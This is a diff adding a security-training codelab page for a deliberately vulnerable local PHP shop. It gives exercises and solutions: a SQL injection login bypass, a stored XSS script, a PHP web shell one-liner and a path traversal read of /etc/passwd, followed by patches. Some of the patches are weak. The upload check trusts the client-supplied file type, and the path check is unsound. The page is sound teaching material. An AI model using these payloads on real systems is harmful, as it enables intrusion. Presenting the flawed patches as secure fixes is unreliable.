@@ -1,0 +1,160 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>Exercises</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid=""
+                  id="exercises"
+                  title="Exercises"
+                  environment="web"
+                  feedback-link="">
+    
+      <google-codelab-step label="Before you begin" duration="0">
+        <p>In this code, you will have four challenges to complete relating to the vulnerabilities implemented on the vulnerable Pixelated Shop.</p>
+<h2 is-upgraded>Prerequisites</h2>
+<ul>
+<li>Basic PHP Web Development Knowledge</li>
+<li>Basic SQL Knowledge</li>
+</ul>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Deploy a Docker Container" duration="0">
+        <ol type="1">
+<li>Install <a href="https://docs.docker.com/get-docker/" target="_blank">docker</a></li>
+<li>Run <code>git clone https://git.cardiff.ac.uk/c1901577/vulnerable-web-application.git</code></li>
+<li>Go into the cloned folder <code>cd vulnerable-web-application</code></li>
+<li>Run <code>docker-compose up</code></li>
+<li>Browse to <a href="http://localhost" target="_blank">http://localhost</a></li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Challenges" duration="0">
+        <h2 is-upgraded>SQL Injection Challenge</h2>
+<p>The login page is vulnerable to an SQL Injection attack. Exploit the vulenrability in order to login as admin without a password.</p>
+<h2 is-upgraded>Cross-Site Scripting Challenge</h2>
+<p>The account section on the website has a stored xss vulnerability. Exploit the vulnerability by creating a payload that creates an alert on the system. To verify this works, login as admin and view the admin panel.</p>
+<h2 is-upgraded>Relative Path Traversal</h2>
+<p>The method the website lists items is vulnerable to relative path traversal attack. Exploit this weakness to read /etc/passwd file on the system.</p>
+<h2 is-upgraded>Unrestricted File Upload</h2>
+<p>It looks like you can upload any file to the system in the user profile section. Use this weakness to upload a malicous php file in order to execute commands remotely. Verify this script works by executing linux commands.</p>
+<h2 is-upgraded>Secure the website</h2>
+<p>Now modify the code to patch all the vulnerabilities on the system. Use the attack method used for the challenges to verify that the vulnerability has been patched</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Attack Methods Solutions" duration="0">
+        <h2 is-upgraded>SQL Injection Challenge</h2>
+<p>Use this payload for the login and password field to login as admin</p>
+<pre><code language="language-sql" class="language-sql">admin&#39; or &#39;&#39;=&#39;
+or &#39;&#39;=&#39;
+</code></pre>
+<p>The query would look like this after the payload</p>
+<pre><code language="language-sql" class="language-sql">SELECT username FROM user WHERE username=&#39;admin&#39; or &#39;&#39;=&#39;&#39; AND password=&#39;&#39; or &#39;&#39;=&#39;&#39; LIMIT 1
+</code></pre>
+<p>The WHERE clause returns true bypassing the requirement for a password.</p>
+<h2 is-upgraded>Cross-site Scripting  (XSS) Challenge</h2>
+<p>Add this payload to the description form</p>
+<pre><code language="language-html" class="language-html">&lt;script&gt;alert(&#34;hello&#34;)&lt;/script&gt;
+</code></pre>
+<p>This payload will generate an alert box saying <code>"hello"</code> when the admin visits the admin panel.</p>
+<h2 is-upgraded>Unrestricted File Upload</h2>
+<p>Upload a one liner php script that can execute remote commands on the server</p>
+<pre><code language="language-php" class="language-php">&lt;?php system(&#34;$_GET[&#39;cmd&#39;]&#34;) ?&gt;
+</code></pre>
+<p>Access the file in the uploads directory and verify that the script works</p>
+<pre><code>http://127.0.0.1/uploads/uploadedFileName?cmd=id
+</code></pre>
+<p>This would output the id of www-data on the machine.</p>
+<h2 is-upgraded>Relative Path Traversal</h2>
+<p>Modify the url when viewing an item</p>
+<pre><code>http://127.0.0.1/shop.php?item=../../../../../etc/passwd
+</code></pre>
+<p>This would display the <code>/etc/passwd</code> file.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Patching Solutions" duration="0">
+        <h2 is-upgraded>SQL Injection</h2>
+<p>Use a prepared statement to protect against SQL Injections</p>
+<h3 is-upgraded>src/login.php</h3>
+<pre><code language="language-sql" class="language-sql">$checkUser = &#34;SELECT username FROM user WHERE username=? AND password=? LIMIT 1&#34;;
+$stmt = $db-&gt;prepare($checkUser);
+$stmt-&gt;bind_param(&#34;ss&#34;, $username, $password);
+$stmt-&gt;execute();
+$result = $stmt-&gt;get_result();
+
+$user = $result-&gt;fetch_assoc();
+</code></pre>
+<h2 is-upgraded>Cross-site Scripting (XSS)</h2>
+<p>Use <code>htmlspecialchars()</code> function to convert special characters HTML entities so that the contents of the script tag does not get executed.</p>
+<h3 is-upgraded>public/admin.php</h3>
+<pre><code language="language-php" class="language-php">&lt;?php if($user[1]): ?&gt;
+    &lt;td&gt; &lt;?= htmlspecialchars($user[1]); ?&gt;&lt;/td&gt;
+&lt;?php else: ?&gt;
+</code></pre>
+<h2 is-upgraded>Unrestricted File Upload</h2>
+<p>Make a whitelist to only allow images formats to be uploaded.</p>
+<h3 is-upgraded>src/updateProfile.php</h3>
+<pre><code language="language-php" class="language-php">$fileType= $_FILES[&#39;uploadFile&#39;][&#39;type&#39;];
+$allowedTypes = array(&#34;image/jpeg&#34;, &#34;image/gif&#34;, &#34;image/png&#34;);
+
+if(in_array($fileType, $allowedTypes)) {
+    //Upload File
+}
+else {
+    //Invalid File Type
+}
+</code></pre>
+<h2 is-upgraded>Relative Path Traversal</h2>
+<p>Use base directories and compare whether the user&#39;s path is inside the allowed directory. If it is outside the directory, deny access.</p>
+<pre><code language="language-php" class="language-php">$baseDir = &#34;items/&#34;;
+    $realDir = realpath($baseDir);
+
+    $userDir = $baseDir . $_GET[&#34;item&#34;];
+    $realUserDir = realpath($userDir);
+
+    if($realUserDir === false || strpos($realUserDir, $baseDir) === false) {
+        echo(&#34;Item does not exist!&#34;);
+    }
+    else {
+        include($userDir);
+    }
+</code></pre>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+  <script src="//support.google.com/inapp/api.js"></script>
+
+</body>
+</html>
